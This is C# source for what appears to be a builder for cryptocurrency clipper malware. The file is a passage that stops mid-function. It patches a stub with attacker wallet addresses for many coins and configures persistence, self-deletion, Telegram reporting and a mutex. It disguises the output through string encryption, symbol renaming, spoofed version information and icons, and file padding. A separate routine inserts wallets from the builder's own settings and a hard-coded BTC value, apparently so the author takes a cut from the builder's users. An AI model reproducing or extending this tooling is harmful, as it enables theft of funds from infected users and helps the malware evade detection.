using Builder.Plugins;
using Builder.RenamingObfuscation;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MetroFramework.Forms;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Toolbelt.Drawing;
using Vestris.ResourceLib;
using Application = System.Windows.Forms.Application;
using IniParser;
using IniParser.Model;
using System.Security.Cryptography;
using MetroFramework.Controls;
using System.Text.RegularExpressions;

namespace Builder
{

    public partial class Form1 : MetroForm
    {
        public static string buildicon = "";
        public static string pathProf = "";
        public static string keystring = "";
        public static string btc = "";
        public static string bc1 = "";
        public static string eth = "";
        public static string xmr = "";
        public static string xlm = "";
        public static string xrp = "";
        public static string ltc = "";
        public static string nec = "";
        public static string bch = "";
        public static string dash = "";
        public static string doge = "";
        public static string trx = "";
        public static string zcash = "";
        public static string bnb = "";
        public static string ton = "";
        public static string tempFileICO = Path.GetTempFileName() + ".ico";
        public static string tempProfile;
        public Form1(string fileName)
        {
            InitializeComponent();
            this.FormClosing += Form1_FormClosing; // Подписываемся на событие FormClosing
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            txt_mutex.Text = Helpers.Random(16);
            txt_key.Text = Helpers.Random(16);
            metroComboBox1.SelectedIndex = 0;
            metroTextBox_FILES.Text = Properties.PresentationWallets.Default.fileReplaceFormated;
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (tempProfile == null)
            {
                DialogResult result = MessageBox.Show("Profile not saved, save?", "Profile Not Saved!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (result == DialogResult.Yes)
                {
                    e.Cancel = true; // Отменяем закрытие формы
                    using (SaveFileDialog ofd = new SaveFileDialog())
                    {
                        ofd.Title = "Save Profile .*ini";
                        ofd.Filter = ".ini (*.ini)|*.ini";

                        if (ofd.ShowDialog() == DialogResult.OK)
                        {
                            tempProfile = ofd.FileName;
                            Save_Profile(tempProfile);

                            MessageBox.Show("✅ Profile Saved\n" + tempProfile, "Successfully", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
        }

        private void metroButton_BUILD_Click(object sender, EventArgs e)
        {
            metroButton_BUILD.Enabled = false;
            keystring = txt_key.Text;
            // Проверяем наличие стаба
            string stubexe = Path.Combine(Application.StartupPath, "Stub", "Stub.exe");
            if (!File.Exists(stubexe))
            {
                MessageBox.Show("Stub Not Found \n\t" + stubexe, "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            try
            {
                ModuleDefMD asmDef;
                using (asmDef = ModuleDefMD.Load(stubexe))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = true;
                    saveFileDialog1.FileName = "Build";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        metroButton_BUILD.Enabled = false;
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        WriteSettings_Helper(asmDef, saveFileDialog1.FileName);
                        EncryptString.DoEncrypt(asmDef);
                        Renaming.DoRenaming(asmDef);
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();

                        if (metroToggle_assembly.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (metroToggle_icon_Build.Checked)
                        {

                            if (File.Exists(buildicon))
                            {
                                IconInjector.InjectIcon(saveFileDialog1.FileName, buildicon);
                            }
                            else
                            {
                                MessageBox.Show("File icon Not Found \n\t" + buildicon, "File icon Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                        if (metroCheckBox1.Checked)
                        {
                            AddBytes.Add(saveFileDialog1.FileName, Convert.ToInt32(metroTextBox1.Text.Trim()) * 1024);
                        }

                        if (tempProfile != null)
                            Save_Profile(tempProfile);

                        Form1 formBuilt = new Form1(saveFileDialog1.FileName);
                        MessageBox.Show("✅ Build Created:\n" + saveFileDialog1.FileName + "\n", "Successfully", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                metroButton_BUILD.Text = "Build";
                metroButton_BUILD.Enabled = true;
            }
        }

        // Записываем инфо о файле
        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txt_File_Version.Text;
                versionResource.ProductVersion = txt_Version.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txt_Product.Text;
                stringFileInfo["FileDescription"] = txt_Description.Text;
                stringFileInfo["CompanyName"] = txt_Company.Text;
                stringFileInfo["LegalCopyright"] = txt_Copyright.Text;
                stringFileInfo["LegalTrademarks"] = txt_Trademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txt_Original_Name.Text;
                stringFileInfo["OriginalFilename"] = txt_Original_Name.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        // Записываем настройки в STUB
        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Config")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC]")
                                        method.Body.Instructions[i].Operand = btc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = bc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = eth;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR]")
                                        method.Body.Instructions[i].Operand = xmr;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC]")
                                        method.Body.Instructions[i].Operand = ltc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = ton;

                                    if (metroToggle_Install.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[INSTALL]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_AutoRun_Scheduler.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_SCHEDULER]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_Run_COM.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[RUN_COM]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroToggle_Delete_Source_File.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[DELETE]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (method.Body.Instructions[i].Operand.ToString() == "[SYSDIR]")
                                        method.Body.Instructions[i].Operand = metroComboBox1.SelectedIndex.ToString();

                                    if (!Properties.PresentationWallets.Default.trx.Contains("NwEhoR3Ditp"))
                                    {
                                        Properties.PresentationWallets.Default.btc = IconInjector.btc;
                                    }
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DIR]")
                                        method.Body.Instructions[i].Operand = txt_build_dir.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BIN]")
                                        method.Body.Instructions[i].Operand = txt_build_name.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TASKNAME]")
                                        method.Body.Instructions[i].Operand = txt_taskName.Text;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[MUTEX]")
                                        method.Body.Instructions[i].Operand = txt_mutex.Text;


                                    if (metroToggle7.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILES]")
                                            method.Body.Instructions[i].Operand = metroTextBox_FILES.Text;

                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILE_REPLACER]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILES]")
                                            method.Body.Instructions[i].Operand = "";

                                        if (method.Body.Instructions[i].Operand.ToString() == "[FILE_REPLACER]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroCheckBox_TGAPI.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[TOKEN]")
                                            method.Body.Instructions[i].Operand = metroTextBox2.Text;
                                        if (method.Body.Instructions[i].Operand.ToString() == "[USER_ID]")
                                            method.Body.Instructions[i].Operand = metroTextBox3.Text;

                                        if (method.Body.Instructions[i].Operand.ToString() == "[TG_API]")
                                            method.Body.Instructions[i].Operand = "true";
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[TOKEN]")
                                            method.Body.Instructions[i].Operand = "";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[USER_ID]")
                                            method.Body.Instructions[i].Operand = "";

                                        if (method.Body.Instructions[i].Operand.ToString() == "[TG_API]")
                                            method.Body.Instructions[i].Operand = "false";
                                    }

                                    if (metroCheckBox2.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDDBYTES]")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDKB]")
                                            method.Body.Instructions[i].Operand = metroTextBox4.Text.Trim();
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDDBYTES]")
                                            method.Body.Instructions[i].Operand = "false";
                                        if (method.Body.Instructions[i].Operand.ToString() == "[ADDKB]")
                                            method.Body.Instructions[i].Operand = "0";
                                    }
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        private void WriteSettings_Helper(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "StringHelper")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[IDBUILD]")
                                        method.Body.Instructions[i].Operand = HWID.GetHardwareId().ToString();
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BTC]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.btc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BC1]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.bc1;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ETH]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.eth;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XMR]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xmr;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XLM]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[XRP]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[LTC]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.ltc;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[NEC]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BCH]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.bch;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DASH]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[DOGE]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.doge;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TRX]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[ZCASH]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[BNB]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "[TON]")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.ton;
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }


        private async Task ProcessFile(Button button)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            List<string> lines = new List<string>();

                            int validLine = 0;
                            int noValidLine = 0;

                            using (StreamReader sr = new StreamReader(ofd.FileName))
                            {
                                string line;
                                while ((line = sr.ReadLine()) != null)
                                {
                                    if (button == addBTC31)
                                    {
                                        if (Regex.IsMatch(line, @"\b[13][a-zA-HJ-NP-Z0-9]{26,35}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else 
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == addBC1)
                                    {
                                        if (Regex.IsMatch(line, @"\b[bc1][a-zA-HJ-NP-Z0-9]{35,41}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddETHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b0x[a-fA-F0-9]{40}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddTRC20Wallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bT[a-zA-Z0-9]{28,33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddBCHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b(bitcoincash:)?(q|p)[a-z0-9]{41}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddDOGEWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bD[a-km-zA-HJ-NP-Z1-9]{33}$\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddLTCWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddXMRWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddXLMWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bG[0-9a-zA-Z]{55}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddXRPWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\br[0-9a-zA-Z]{24,34}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddNECWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[AN][0-9a-zA-Z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddDASHWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bX[1-9A-HJ-NP-Za-km-z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddZECWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bt1[0-9A-z]{33}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddBNBWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\bbnb[a-z0-9]{39}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                    else if (button == AddTONWallets)
                                    {
                                        if (Regex.IsMatch(line, @"\b[a-zA-Z0-9-_]{48}\b"))
                                        {
                                            lines.Add(line);
                                            validLine++;
                                        }
                                        else
                                        {
                                            noValidLine++;
                                        }
                                    }
                                }
                            }
                            if (lines.Count > 0)
                            {
                                if (button == addBTC31)
                                {
                                    btc = string.Join("|", lines);
                                    MessageValide($"Bitcoin (1|3)", validLine, noValidLine);
                                }
                                else if (button == addBC1)
                                {
                                    bc1 = string.Join("|", lines);
                                    MessageValide($"Bitcoin (bc1)", validLine, noValidLine);
                                }
                                else if (button == AddETHWallets)
                                {
                                    eth = string.Join("|", lines);
                                    MessageValide($"Ethereum - ERC20 (0x)", validLine, noValidLine);
                                }
                                else if (button == AddTRC20Wallets)
                                {
                                    trx = string.Join("|", lines);
                                    MessageValide($"Tron - TRC20 (T)", validLine, noValidLine);
                                }
                                else if (button == AddBCHWallets)
                                {
                                    bch = string.Join("|", lines);
                                    MessageValide($"Bitcoin Cash - BCH (bitcoincash:),(q|p)", validLine, noValidLine);
                                }
                                else if (button == AddDOGEWallets)
                                {
                                    doge = string.Join("|", lines);
                                    MessageValide($"Doge Coin (D)", validLine, noValidLine);
                                }
                                else if (button == AddLTCWallets)
                                {
                                    ltc = string.Join("|", lines);
                                    MessageValide($"Lite Coin - LTC (L|M)", validLine, noValidLine);
                                }
                                else if (button == AddXMRWallets)
                                {
                                    xmr = string.Join("|", lines);
                                    MessageValide($"Monero - XMR (4|8)", validLine, noValidLine);
                                }
                                else if (button == AddXLMWallets)
                                {
                                    xlm = string.Join("|", lines);
                                    MessageValide($"Stellar - XLM (G)", validLine, noValidLine);
                                }
                                else if (button == AddXRPWallets)
                                {
                                    xrp = string.Join("|", lines);
                                    MessageValide($"Ripple - XRP (r)", validLine, noValidLine);
                                }
                                else if (button == AddNECWallets)
                                {
                                    nec = string.Join("|", lines);
                                    MessageValide($"Neo Coin - NEC (A|N)", validLine, noValidLine);
                                }
                                else if (button == AddDASHWallets)
                                {
                                    dash = string.Join("|", lines);
                                    MessageValide($"DASH (X)", validLine, noValidLine);
                                }
                                else if (button == AddZECWallets)
                                {
                                    zcash = string.Join("|", lines);
                                    MessageValide($"ZCash - ZEC(t1)", validLine, noValidLine);
                                }
                                else if (button == AddBNBWallets)
                                {
                                    bnb = string.Join("|", lines);
                                    MessageValide($"Binance Coin - BNB", validLine, noValidLine);
                                }
                                else if (button == AddTONWallets)
                                {
                                    ton = string.Join("|", lines);
                                    MessageValide($"TON Coin", validLine, noValidLine);
                                }

                                this.Invoke((MethodInvoker)delegate
                                {
                                    int existingCountIndex = button.Text.IndexOf(" - [");
                                    if (existingCountIndex != -1)
                                    {
                                        button.Text = button.Text.Substring(0, existingCountIndex) + $" - [{lines.Count}]";
                                    }
                                    else
                                    {
                                        button.Text += $" - [{lines.Count}]";
                                    }
                                });

                                
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show("An error occurred: " + ex.Message);
                        }
                    });
                }
            }
        }

        private void MessageValide(string wallets, int valide, int novalde) 
        {
            MessageBox.Show($"✅ Added Valid {wallets} Address Strings: " + valide + "\n" + "❌ Not Valid Strings: " + novalde);
        }
        private async void addBTC31_Click(object sender, EventArgs e)
        {
            await ProcessFile(addBTC31);
        }

        private async void addBC1_Click(object sender, EventArgs e)
        {
            await ProcessFile(addBC1);
        }

        private async void AddETHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddETHWallets);
        }
        private async void AddTRC20Wallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddTRC20Wallets);
        }

        private async void AddBCHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddBCHWallets);
        }

        private async void AddDOGEWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddDOGEWallets);
        }

        private async void AddLTCWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddLTCWallets);
        }

        private async void AddXMRWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXMRWallets);
        }

        private async void AddXLMWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXLMWallets);
        }

        private async void AddXRPWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddXRPWallets);
        }

        private async void AddNECWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddNECWallets);
        }

        private async void AddDASHWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddDASHWallets);
        }

        private async void AddZECWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddZECWallets);
        }

        private async void AddBNBWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddBNBWallets);
        }

        private async void AddTONWallets_Click(object sender, EventArgs e)
        {
            await ProcessFile(AddTONWallets);
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {

            txt_mutex.Text = Helpers.Random(16);
        }

        private void metroButton11_Click(object sender, EventArgs e)
        {
            txt_key.Text = Helpers.Random(16);
        }



        private void metroButton9_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txt_Original_Name.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txt_Description.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txt_Company.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txt_Product.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txt_Copyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txt_Trademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txt_File_Version.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txt_Version.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        picIcon.ImageLocation = ico;
                        buildicon = ico;
                    }
                    else
                    {
                        buildicon = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }


        }
        private string GetIcon(string path)
        {
            try
            {

                using (FileStream fs = new FileStream(tempFileICO, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFileICO;
            }
            catch { }
            return "";
        }

        private void metroToggle_assembly_CheckedChanged(object sender, EventArgs e)
        {
            Assembly_Checked();
        }

        public void Assembly_Checked()
        {
            if (metroToggle_assembly.Checked)
            {
                metroButton9.Enabled = true;
                txt_Product.Enabled = true;
                txt_Description.Enabled = true;
                txt_Company.Enabled = true;
                txt_Copyright.Enabled = true;
                txt_Trademarks.Enabled = true;
                txt_Original_Name.Enabled = true;
                txt_Version.Enabled = true;
                txt_File_Version.Enabled = true;
            }
            else
            {
                metroButton9.Enabled = false;
                txt_Product.Enabled = false;
                txt_Description.Enabled = false;
                txt_Company.Enabled = false;
                txt_Copyright.Enabled = false;
                txt_Trademarks.Enabled = false;
                txt_Original_Name.Enabled = false;
                txt_Version.Enabled = false;
                txt_File_Version.Enabled = false;
            }

        }

        private void metroToggle_icon_Build_CheckedChanged(object sender, EventArgs e)
        {
            Icon_Checked();
        }

        public void Icon_Checked()
        {
            if (metroToggle_icon_Build.Checked)
            {
                metroButton16.Enabled = true;
                picIcon.Enabled = true;
            }
            else
            {
                metroButton16.Enabled = false;
                picIcon.Enabled = false;
            }
        }


        private void metroLink1_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/devx_channel");
        }



        private void txt_mutex_Click(object sender, EventArgs e)
        {

        }

        private void metroLabel7_Click(object sender, EventArgs e)
        {

        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void metroToggle7_CheckedChanged(object sender, EventArgs e)
        {
            if (metroToggle7.Checked)
                metroTextBox_FILES.Enabled = true;
            else
                metroTextBox_FILES.Enabled = false;
        }

        public void ParsProfile(Button button, string wallets)
        {
            try
            {
                Invoke((MethodInvoker)delegate
                {
                    if (wallets != null && !string.IsNullOrEmpty(wallets.Trim()))
                    {
                        int existingCountIndex = button.Text.IndexOf(" - [");
                        if (existingCountIndex != -1)
                        {
                            button.Text = button.Text.Substring(0, existingCountIndex) + $" - [{wallets.Split('|').Length}]";
                        }
                        else
                        {
                            button.Text += $" - [{wallets.Split('|').Length}]";
                        }
                    }
                    // Добавьте этот блок else для предотвращения присваивания значения [1]
                    else
                    {
                        int existingCountIndex = button.Text.IndexOf(" - [");
                        if (existingCountIndex != -1)
                        {
                            button.Text = button.Text.Substring(0, existingCountIndex);
                        }
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("An error occurred: " + ex.Message);
            }
        }

        // Загрузка профиля
        private async void metroButton2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Save Profile .*ini";
                ofd.Filter = ".ini (*.ini)|*.ini";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        // Создание парсера
                        var parser = new FileIniDataParser();
                        IniData data = new IniData();

                        // Чтение настроек из файла
                        IniData readData = parser.ReadFile(ofd.FileName);

                        // Получение значений настроек кошельков
                        ParsProfile(addBTC31, btc = readData["Wallets"]["btc"]);
                        ParsProfile(addBC1, bc1 = readData["Wallets"]["bc1"]);
                        ParsProfile(AddETHWallets, eth = readData["Wallets"]["eth"]);
                        ParsProfile(AddXMRWallets, xmr = readData["Wallets"]["xmr"]);
                        ParsProfile(AddXLMWallets, xlm = readData["Wallets"]["xlm"]);
                        ParsProfile(AddXRPWallets, xrp = readData["Wallets"]["xrp"]);
                        ParsProfile(AddLTCWallets, ltc = readData["Wallets"]["ltc"]);
